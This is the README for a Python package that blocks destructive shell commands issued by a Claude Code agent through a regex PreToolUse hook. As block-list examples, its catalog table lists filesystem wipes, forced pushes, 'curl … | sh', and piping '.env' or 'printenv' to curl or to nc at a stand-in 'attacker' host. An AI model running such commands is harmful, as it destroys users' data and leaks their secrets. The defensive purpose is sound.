# claude-safety-guard

**A loud stop between your Claude Code agent and a destroyed filesystem.**

`claude-safety-guard` is a tiny, zero-dependency Python package that plugs
into [Claude Code][claude-code]'s `PreToolUse` hook and blocks the small
set of shell commands that are nearly always a mistake when issued by an
agent: `rm -rf /`, `git push --force` to `main`, `curl … | sh`, piping
`.env` into `curl`, and ~20 other well-known destructive shapes.

It is intentionally a thin regex layer rather than a shell parser. The
goal is a **loud stop, not silent cleverness**: every rule has a stable ID,
a human-readable reason, and can be allowlisted individually without
losing coverage of the rest of the catalog.

[claude-code]: https://docs.claude.com/en/docs/claude-code

---

## Why this exists

Agents sometimes typo. Sometimes they get confused about which directory
they are in. Sometimes an attacker-crafted repository README contains a
"setup step" that is actually a data-exfiltration command. A
PreToolUse hook is the cheapest place in the stack to say *"no, not
this one"*, because it runs **before** the command hits the shell.

Three design commitments:

1. **Fail loud, not clever.** The catalog is narrow and focused on shapes
   that have near-zero false positives in practice. A finding always
   surfaces a stable `pattern_id` so you can allowlist it if you
   disagree.
2. **Fail open on the hook itself.** If the hook crashes, the agent
   still works — a broken guard must not brick your workflow.
3. **Zero runtime dependencies.** Pure Python stdlib. Nothing to
   vendor, nothing to audit.

---

## Install

```bash
pip install claude-safety-guard
```

Requires Python 3.10+.

### Quick check it works

```bash
claude-safety-guard check -- rm -rf /
# BLOCK   rm -rf /
#   - [block] fs-rm-rf-root               Recursive force-delete targeting the filesystem root or /home. …
#     matched: 'rm -rf /'

claude-safety-guard check -- ls -la
# ALLOW   ls -la
```

---

## Wiring it into Claude Code

Edit `~/.claude/settings.json` (or your project-local
`.claude/settings.json`) and add a PreToolUse hook for `Bash`:

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "claude-safety-guard hook"
          }
        ]
      }
    ]
  }
}
```

That's it. The next time Claude Code tries to run a Bash command, the
envelope flows through the guard. Blocked commands are denied with a
reason Claude Code surfaces back to the model; allowed commands pass
through untouched.

A ready-to-copy example lives at
[`examples/settings.json`](examples/settings.json).

---

## What it catches

| Category           | Examples                                                        |
|--------------------|-----------------------------------------------------------------|
| Filesystem         | `rm -rf /`, `rm -rf $HOME`, `rm -rf .`, `mkfs.ext4 /dev/sda1`   |
| Git                | `git push --force origin main`, `git reset --hard origin/main` |
| Secrets            | `cat .env \| curl …`, `printenv \| nc attacker 9999`            |
| Supply-chain       | `curl … \| sh`, `pip install https://…`                         |
| Privilege / kernel | `echo hunter2 \| sudo -S …`, fork bombs                         |
| Package managers   | `apt-get purge *`                                               |

Full catalog: [`docs/PATTERNS.md`](docs/PATTERNS.md) — or run:

```bash
claude-safety-guard list-rules
```

Every pattern has an ID (`fs-rm-rf-root`, `git-force-push-mainline`, …)
that is stable across releases. The catalog is **additive**: new rules
arrive in minor releases; existing IDs never change their meaning.

---

## Configuration

Config file (TOML) lives at, in priority order:

1. `$CLAUDE_SAFETY_GUARD_CONFIG`
2. `$XDG_CONFIG_HOME/claude-safety-guard/config.toml`
3. `~/.config/claude-safety-guard/config.toml`

```toml
# ~/.config/claude-safety-guard/config.toml

# Silence specific rules. Every entry is a named exception. Unknown IDs
# are dropped with a warning on stderr.
allowlist = [
  # "fs-rm-rf-home-var",
  # "git-clean-fdx",
]

# If true, BLOCK findings are downgraded to WARN. Useful for a week of
# observation before you turn enforcement on.
dry_run = false

# If true, WARN findings ask the user in Claude Code instead of passing
# through silently.
ask_on_warn = false
```

Every CLI invocation takes `--config PATH` to override the lookup.

---

## CLI

```
claude-safety-guard check <command…>   Evaluate and print result (exit 1 on BLOCK).
claude-safety-guard check --json …     Machine-readable JSON output.
claude-safety-guard check --dry-run …  Downgrade BLOCK to WARN (exit 0).
claude-safety-guard hook               Run as the PreToolUse hook (stdin JSON).
claude-safety-guard list-rules         Print the full catalog as a table.
claude-safety-guard version            Print the version.
```

For a command with flags, use `--` so argparse doesn't grab the flags:

```bash
claude-safety-guard check -- rm -rf /
claude-safety-guard check -- git push --force origin main
```

---

## Library API

The same engine is available as a library if you want to wire the guard
into CI, a shell wrapper, or your own agent.

```python
from claude_safety_guard import evaluate

decision = evaluate("rm -rf /")
print(decision.outcome)        # Outcome.BLOCK
print(decision.findings[0].pattern_id)  # "fs-rm-rf-root"
print(decision.to_dict())
```

All public types (`Decision`, `Finding`, `Pattern`, `Severity`,
`EvaluationOptions`) are frozen dataclasses, so they are safe to pass
between threads and hashable where Python allows.

---

## Threat model & non-goals

The guard is a **speed bump, not a sandbox**:

* It does **not** shell-parse. A command inside single-quoted strings
  will still fire if the text shape matches, by design. If you
  legitimately need to `echo 'rm -rf /' > note.txt`, add `fs-rm-rf-root`
  to your allowlist or use a heredoc. See
  `tests/test_patterns.py::test_string_quoting_is_not_bypassed`.
* It does **not** defend against a root-shell adversary who can already
  edit `~/.claude/settings.json` or disable the hook.
* It does **not** attempt anomaly detection, ML, or heuristics. Every
  rule is an auditable regex with a stable ID.

Security reports: see [SECURITY.md](SECURITY.md).

---

## Contributing

New patterns very welcome, especially if you have a concrete incident
that motivated them. See [CONTRIBUTING.md](CONTRIBUTING.md). Each new
pattern must come with at least **one positive test** (commands that
rightly trigger it) and **one negative test** (commands that look
similar but must not trigger it).

---

## License

Apache License 2.0. See [LICENSE](LICENSE) and [NOTICE](NOTICE).
